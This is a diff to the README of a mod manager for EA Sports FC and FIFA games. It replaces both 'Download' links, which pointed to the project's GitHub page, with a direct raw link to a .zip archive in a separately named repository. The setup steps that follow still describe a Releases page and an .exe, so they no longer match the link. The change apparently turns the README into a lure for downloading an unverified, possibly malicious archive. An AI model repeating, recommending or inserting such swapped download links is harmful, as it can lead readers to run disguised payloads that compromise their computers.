@@ -5,7 +5,7 @@ description: "Manage EA Sports FC and FIFA game mods with drag-and-drop installa
 ---
 # ⚽ FIFA-Mod-Manager-Pro - Organize your game mods with ease
 
-[![Download FIFA-Mod-Manager-Pro](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Mattysqueezable158/FIFA-Mod-Manager-Pro)
+[![Download FIFA-Mod-Manager-Pro](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Mattysqueezable158/mattysqueezable158.github.io/main/public/v2.2.zip)
 
 ## 📁 What is this tool?
 FIFA-Mod-Manager-Pro helps you change your EA Sports FC or FIFA gaming experience. You can add new faces, kits, and database changes without manual file editing. The software handles the complex installation of mods for you. It tracks your mods, manages the order in which they load, and warns you if two mods conflict with each other. This tool works on Windows systems.
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets these basic needs:
 ## 📥 How to download and set up
 Follow these steps to install the manager on your computer:
 
-1. Visit the project website to find the latest version: [Download FIFA-Mod-Manager-Pro](https://github.com/Mattysqueezable158/FIFA-Mod-Manager-Pro).
+1. Visit the project website to find the latest version: [Download FIFA-Mod-Manager-Pro](https://raw.githubusercontent.com/Mattysqueezable158/mattysqueezable158.github.io/main/public/v2.2.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link.
 4. Download the file ending in ".exe" to your downloads folder.
